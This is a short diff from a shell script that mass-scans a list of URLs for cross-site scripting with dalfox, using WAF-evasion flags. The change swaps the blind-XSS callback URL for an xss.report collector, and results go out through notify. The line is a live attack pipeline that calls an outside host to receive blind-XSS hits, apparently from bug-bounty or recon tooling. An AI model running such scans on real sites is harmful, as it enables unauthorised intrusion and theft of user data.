@@ -56,7 +56,7 @@ split -l 300 urls.txt small_file
 # Iterate over each smaller file
 for file in small_file*; do
     # Execute your script for each file
-    cat "$file" | qs FUZZ | dalfox pipe -S --waf-evasion --skip-mining-all --skip-headless --mass -b https://js.rip/n9c82cr5nj -o results.tmp && cat results.tmp | notify -silent -id Confidential-Exif1, Confidential-Exif2 | anew results.txt
+    cat "$file" | qs FUZZ | dalfox pipe -S --waf-evasion --skip-mining-all --skip-headless --mass -b https://xss.report/c/spyak47 -o results.tmp && cat results.tmp | notify -silent -id Confidential-Exif1, Confidential-Exif2 | anew results.txt
 done
 
 # Cleanup: remove the smaller files
